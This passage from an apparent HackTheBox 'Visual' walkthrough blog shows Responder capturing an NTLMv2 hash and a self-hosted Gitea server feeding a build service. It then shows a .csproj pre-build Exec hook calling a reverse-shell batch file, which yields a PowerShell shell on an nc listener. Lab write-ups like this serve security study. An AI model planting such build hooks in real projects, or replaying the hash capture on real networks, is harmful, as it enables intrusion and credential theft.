+When we provide our system&rsquo;s IP address, we will receive a connection:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">visual</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nvlp</span> <span class="mi">80</span>
+</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">80</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">144.164</span><span class="p">]</span> <span class="mi">49672</span>
+</span></span><span class="line"><span class="cl"><span class="n">GET</span> <span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="n">info</span><span class="o">/</span><span class="n">refs</span><span class="err">?</span><span class="n">service</span><span class="o">=</span><span class="n">git</span><span class="o">-</span><span class="n">upload</span><span class="o">-</span><span class="n">pack</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">git</span><span class="o">/</span><span class="mf">2.41</span><span class="o">.</span><span class="mf">0.</span><span class="n">windows</span><span class="o">.</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">deflate</span><span class="p">,</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">br</span><span class="p">,</span> <span class="n">zstd</span>
+</span></span><span class="line"><span class="cl"><span class="n">Pragma</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Git</span><span class="o">-</span><span class="n">Protocol</span><span class="p">:</span> <span class="n">version</span><span class="o">=</span><span class="mi">2</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using responder, we can receive an NTLM hash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/visual]
+</span></span><span class="line"><span class="cl">└─$ sudo responder -I tun0
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span class="line"><span class="cl">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+</span></span><span class="line"><span class="cl">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+</span></span><span class="line"><span class="cl">                   |__|
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">[+] Listening for events...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[HTTP] NTLMv2 Client   : 10.129.144.164
+</span></span><span class="line"><span class="cl">[HTTP] NTLMv2 Username : VISUAL\enox
+</span></span><span class="line"><span class="cl">[HTTP] NTLMv2 Hash     : enox::VISUAL:49ed5e7eb09d8a6d:6A0C757814963C7E2CF4D97DE665A407:010100000000000098A826EAA6F4D9018E894BC5012324680000000002000800300058005600370001001E00570049004E002D00460053003500550036005900590043004A00470047000400140030005800560037002E004C004F00430041004C0003003400570049004E002D00460053003500550036005900590043004A00470047002E0030005800560037002E004C004F00430041004C000500140030005800560037002E004C004F00430041004C000800300030000000000000000000000000300000FB112DC1D7A6EBADEFA202CE1B3B39EEC9982696A12273A639BEAB0E53B514620A001000000000000000000000000000000000000900220048005400540050002F00310030002E00310030002E00310034002E003100330034000000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unfortunately, the usefulness of this retrieval is limited since only port 80 is open.</p>
+<h3 id="troubleshooting-the-git-repo-building">Troubleshooting the Git Repo building</h3>
+<p>Back to the website, we are detailed an error that reveals it is searching for a <code>.sln</code> file, the core component of a visual studio project
+<img src="/post/hackthebox-visual/Images/repoerror.png"
+	width="778"
+	height="154"
+	srcset="/post/hackthebox-visual/Images/repoerror_hu2e165a2e37797696bd2a2e9479c1d60e_18571_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/repoerror_hu2e165a2e37797696bd2a2e9479c1d60e_18571_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="505"
+		data-flex-basis="1212px"
+	
+>
+Using a python http server, we can see the request information more clearly. This is not simply downloading a .sln file, but rather trying to clone a <code>git</code> repository. Although it may be possible to emulate a git repo from an http server with the right file configuration, this is beyond my skillset. I opted to install <code>Gitea</code> locally, so I can host my own server that  the machine can pull from.
+Note that these HTB machines are isolated from the broad internet, so pulling from a public web service like github will not be possible.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">visual</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>                                                
+</span></span><span class="line"><span class="cl"><span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.129</span><span class="o">.</span><span class="mf">144.164</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">01</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="n">code</span> <span class="mi">404</span><span class="p">,</span> <span class="n">message</span> <span class="ne">File</span> <span class="ow">not</span> <span class="n">found</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.129</span><span class="o">.</span><span class="mf">144.164</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">01</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">16</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="s2">&#34;GET /info/refs?service=git-upload-pack HTTP/1.1&#34;</span> <span class="mi">404</span> <span class="o">-</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To set up gitea, I followed <a class="link" href="https://docs.gitea.com/installation/database-prep"  target="_blank" rel="noopener"
+    >the preparations from this post.</a> The gitea binary/setup was retrieved from their main site, <a class="link" href="https://about.gitea.com/"  target="_blank" rel="noopener"
+    >https://about.gitea.com/</a>. There are many release versions to select, so be sure it matches your system requirements.</p>
+<h4 id="setting-up-a-self-hosted-gitea-server">Setting up a self-hosted Gitea server</h4>
+<p>Before anything, it is necessary to initialize mysql:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo service mysql start
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, we can enter mysql by invoking sudo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/visual/test3/MyApp]
+</span></span><span class="line"><span class="cl">└─$ sudo mysql -u root
+</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with ; or \g.
+</span></span><span class="line"><span class="cl">Your MariaDB connection id is 2506
+</span></span><span class="line"><span class="cl">Server version: 10.11.4-MariaDB-1 Debian 12
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB [(none)]&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, we can follow the instructions to set up a local gitea service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MariaDB [(none)]&gt; use mysql;
+</span></span><span class="line"><span class="cl">Reading table information for completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database changed
+</span></span><span class="line"><span class="cl">MariaDB [mysql]&gt; CREATE USER &#39;gitea&#39;@&#39;%&#39; IDENTIFIED BY &#39;gitea&#39;;
+</span></span><span class="line"><span class="cl">Query OK, 0 rows affected (0.019 sec)
+</span></span><span class="line"><span class="cl">MariaDB [mysql]&gt; CREATE DATABASE giteadb CHARACTER SET &#39;utf8mb4&#39; COLLATE &#39;utf8mb4_unicode_ci&#39;;
+</span></span><span class="line"><span class="cl">Query OK, 1 row affected (0.011 sec)
+</span></span><span class="line"><span class="cl">MariaDB [mysql]&gt; GRANT ALL PRIVILEGES ON giteadb.* TO &#39;gitea&#39;;
+</span></span><span class="line"><span class="cl">Query OK, 0 rows affected (0.011 sec)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And now, we are ready to initialize gitea. Start by executing the extracted binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/gitea]
+</span></span><span class="line"><span class="cl">└─$ ./gitea-1.21-linux-amd64 
+</span></span><span class="line"><span class="cl">2023/10/03 20:34:06 cmd/web.go:242:runWeb() [I] Starting Gitea on PID: 66899
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">2023/10/03 20:34:06 cmd/web.go:304:listen() [I] Listen: http://0.0.0.0:3000
+</span></span><span class="line"><span class="cl">2023/10/03 20:34:06 cmd/web.go:308:listen() [I] AppURL(ROOT_URL): http://localhost:3000/
+</span></span><span class="line"><span class="cl">2023/10/03 20:34:06 ...s/graceful/server.go:70:NewServer() [I] Starting new Web server: tcp:0.0.0.0:3000 on PID: 66899
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This execution sets the gitea service on port 3000. Before we can start running, we need to configure it to use our MySQL server. Below is the completed form for myself. Note the password will be whatever you made the IDENTIFIED BY parameter during the database setup. In this scenario, it is <code>gitea</code>.
+<img src="/post/hackthebox-visual/Images/giteaconfig.png"
+	width="1156"
+	height="660"
+	srcset="/post/hackthebox-visual/Images/giteaconfig_hu273b853311e39239e5575c3ff0e46b03_55983_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/giteaconfig_hu273b853311e39239e5575c3ff0e46b03_55983_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="420px"
+	
+>
+Press &ldquo;Install Gitea&rdquo; at the bottom of the page, and setup will be complete.
+After it all, we finally have our own gitea service set up and running:
+<img src="/post/hackthebox-visual/Images/gitea1.png"
+	width="1413"
+	height="558"
+	srcset="/post/hackthebox-visual/Images/gitea1_hu2a70c7cdee26482abd446c7a40fc49a5_41399_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/gitea1_hu2a70c7cdee26482abd446c7a40fc49a5_41399_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="607px"
+	
+>
+Now we can put whatever we want for an account, host our own repos, and even share them with whoever can access our system. Since I made this with the exclusive purpose of interacting with the box, I just made my account using the completely original <code>asdf</code> credentials.</p>
+<h4 id="supplying-a-visual-studio-project">Supplying a Visual Studio project</h4>
+<p>I don&rsquo;t typically do visual studio things, but I have an old Chip8 project that was built with visual studio. I cloned this repo, then submitted a copy to this local gitea server:
+<img src="/post/hackthebox-visual/Images/test1.png"
+	width="594"
+	height="482"
+	srcset="/post/hackthebox-visual/Images/test1_hudecbdcb1a6efa5a0baf037db0e5c30bc_32327_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/test1_hudecbdcb1a6efa5a0baf037db0e5c30bc_32327_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Chip8 project repo, for testing the build process"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="123"
+		data-flex-basis="295px"
+	
+>
+Other <code>.sln</code> sources can probably be easily obtained, or even creating one by launching Visual Studio if that is an option.
+When we send this to build, we can see a new error message:</p>
+<p><img src="/post/hackthebox-visual/Images/builderror.png"
+	width="1084"
+	height="373"
+	srcset="/post/hackthebox-visual/Images/builderror_hu43b52154b5bcb4486d02a7e93dd71292_102811_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/builderror_hu43b52154b5bcb4486d02a7e93dd71292_102811_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="697px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Build started 10/2/2023 8:19:35 AM.
+</span></span><span class="line"><span class="cl">Logging verbosity is set to: Detailed.Process = &#34;C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\msbuild.exe&#34;
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">Build FAILED.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&#34;C:\Windows\Temp\32a8f43cea993e0b28dd5c9e25ec34\Chip8.sln&#34; (default target) (1) -&gt;
+</span></span><span class="line"><span class="cl">(Build target) -&gt; 
+</span></span><span class="line"><span class="cl">  C:\Windows\Temp\32a8f43cea993e0b28dd5c9e25ec34\Chip8.sln.metaproj : error MSB3202: The project file &#34;C:\Windows\Temp\32a8f43cea993e0b28dd5c9e25ec34\Chip8\Chip8.csproj&#34; was not found. [C:\Windows\Temp\32a8f43cea993e0b28dd5c9e25ec34\Chip8.sln]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    0 Warning(s)
+</span></span><span class="line"><span class="cl">    1 Error(s)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Time Elapsed 00:00:00.34
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For whatever reason, it is unable to find dependencies in the Chip8 folder.. After moving files around and trying other simple renaming tactics, I was unable to get the Chip8 emulator to build.</p>
+<h4 id="creating-a-simple-dotnet-project">Creating a simple dotnet project</h4>
+<p>Next, I opted for a more simple project starting with a <a class="link" href="https://dotnet.microsoft.com/en-us/learn/dotnet/hello-world-tutorial/intro"  target="_blank" rel="noopener"
+    >basic dotnet tutorial</a>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/visual/test2]
+</span></span><span class="line"><span class="cl">└─$ dotnet new console -o MyApp -f net6.0
+</span></span><span class="line"><span class="cl">The template &#34;Console App&#34; was created successfully.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Processing post-creation actions...
+</span></span><span class="line"><span class="cl">Running &#39;dotnet restore&#39; on /home/kali/Documents/visual/test2/MyApp/MyApp.csproj...
+</span></span><span class="line"><span class="cl">  Determining projects to restore...
+</span></span><span class="line"><span class="cl">  Restored /home/kali/Documents/visual/test2/MyApp/MyApp.csproj (in 126 ms).
+</span></span><span class="line"><span class="cl">Restore succeeded.
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/visual/test2]
+</span></span><span class="line"><span class="cl">└─$ cd MyApp 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/visual/test2/MyApp]
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">MyApp.csproj  obj  Program.cs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Trying to build now will result in an error about missing the <code>sln</code> file, so I grabbed the Chip8.sln file from earlier, and fixed the names to &ldquo;MyApp&rdquo;:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Microsoft Visual Studio Solution File, Format Version 12.00
+</span></span><span class="line"><span class="cl"># Visual Studio 15
+</span></span><span class="line"><span class="cl">VisualStudioVersion = 15.0.28010.2050
+</span></span><span class="line"><span class="cl">MinimumVisualStudioVersion = 10.0.40219.1
+</span></span><span class="line"><span class="cl">Project(&#34;{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}&#34;) = &#34;MyApp&#34;, &#34;MyApp.csproj&#34;, &#34;{740C32CA-9964-445F-8514-062C4228FD28}&#34;
+</span></span><span class="line"><span class="cl">EndProject
+</span></span><span class="line"><span class="cl">Global
+</span></span><span class="line"><span class="cl">	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+</span></span><span class="line"><span class="cl">		Debug|Any CPU = Debug|Any CPU
+</span></span><span class="line"><span class="cl">		Release|Any CPU = Release|Any CPU
+</span></span><span class="line"><span class="cl">	EndGlobalSection
+</span></span><span class="line"><span class="cl">	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+</span></span><span class="line"><span class="cl">		{740C32CA-9964-445F-8514-062C4228FD28}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+</span></span><span class="line"><span class="cl">		{740C32CA-9964-445F-8514-062C4228FD28}.Debug|Any CPU.Build.0 = Debug|Any CPU
+</span></span><span class="line"><span class="cl">		{740C32CA-9964-445F-8514-062C4228FD28}.Release|Any CPU.ActiveCfg = Release|Any CPU
+</span></span><span class="line"><span class="cl">		{740C32CA-9964-445F-8514-062C4228FD28}.Release|Any CPU.Build.0 = Release|Any CPU
+</span></span><span class="line"><span class="cl">	EndGlobalSection
+</span></span><span class="line"><span class="cl">	GlobalSection(SolutionProperties) = preSolution
+</span></span><span class="line"><span class="cl">		HideSolutionNode = FALSE
+</span></span><span class="line"><span class="cl">	EndGlobalSection
+</span></span><span class="line"><span class="cl">	GlobalSection(ExtensibilityGlobals) = postSolution
+</span></span><span class="line"><span class="cl">		SolutionGuid = {45D5498A-0A7F-455B-B1DD-4A93EFD46DE3}
+</span></span><span class="line"><span class="cl">	EndGlobalSection
+</span></span><span class="line"><span class="cl">EndGlobal
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now when we submit this repo for building, the build will pass! We are given the following files in return:
+<img src="/post/hackthebox-visual/Images/build.png"
+	width="769"
+	height="448"
+	srcset="/post/hackthebox-visual/Images/build_hu58959acf9e5cbf22c664c86ad7cd459c_30754_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/build_hu58959acf9e5cbf22c664c86ad7cd459c_30754_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="411px"
+	
+>
+Now we can have the service build executables for us, but how can this be abused? The key hint is the emphasis on using visual studio.</p>
+<h3 id="exploiting-vss-pre-build-event">Exploiting VS&rsquo;s pre-build event</h3>
+<p>Visual Studio supports <a class="link" href="https://learn.microsoft.com/en-us/visualstudio/ide/reference/pre-build-event-post-build-event-command-line-dialog-box?view=vs-2022"  target="_blank" rel="noopener"
+    >pre-build event execution</a> that we can use to execute our own malicious scripts. The easiest way to do so is use Visual Studio&rsquo;s GUI, however I do not have this installed. I used <a class="link" href="https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022"  target="_blank" rel="noopener"
+    >this article</a> as a reference to introduce manually. Very simply, we can add a reverse shell <code>bat</code> file to our repository, and edit the <code>csproj</code> file to call the file. <code>MyApp2.csproj</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;Project</span> <span class="na">Sdk=</span><span class="s">&#34;Microsoft.NET.Sdk&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Target</span> <span class="na">Name=</span><span class="s">&#34;PreBuild&#34;</span> <span class="na">BeforeTargets=</span><span class="s">&#34;PreBuildEvent&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Exec</span> <span class="na">Command=</span><span class="s">&#34;call prebuild.bat&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Target&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;PropertyGroup&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;OutputType&gt;</span>Exe<span class="nt">&lt;/OutputType&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;TargetFramework&gt;</span>net6.0<span class="nt">&lt;/TargetFramework&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ImplicitUsings&gt;</span>enable<span class="nt">&lt;/ImplicitUsings&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Nullable&gt;</span>enable<span class="nt">&lt;/Nullable&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/PropertyGroup&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Project&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The new repository:
+<img src="/post/hackthebox-visual/Images/prebuild.png"
+	width="734"
+	height="602"
+	srcset="/post/hackthebox-visual/Images/prebuild_huf952e36dad6db642f834aadd9a070388_56848_480x0_resize_box_3.png 480w, /post/hackthebox-visual/Images/prebuild_huf952e36dad6db642f834aadd9a070388_56848_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="292px"
+	
+>
+Now when this is submitted for building, I receive a connection on my <code>nc</code> listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/visual/test4/MyApp2]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 443
+</span></span><span class="line"><span class="cl">listening on [any] 443 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.139.209] 49710
+</span></span><span class="line"><span class="cl">whoami                                                                                                              
+</span></span><span class="line"><span class="cl">visual\enox                                                                                                         
+</span></span><span class="line"><span class="cl">PS C:\Windows\Temp\b492bdbeb505f5afab24f97c093323&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
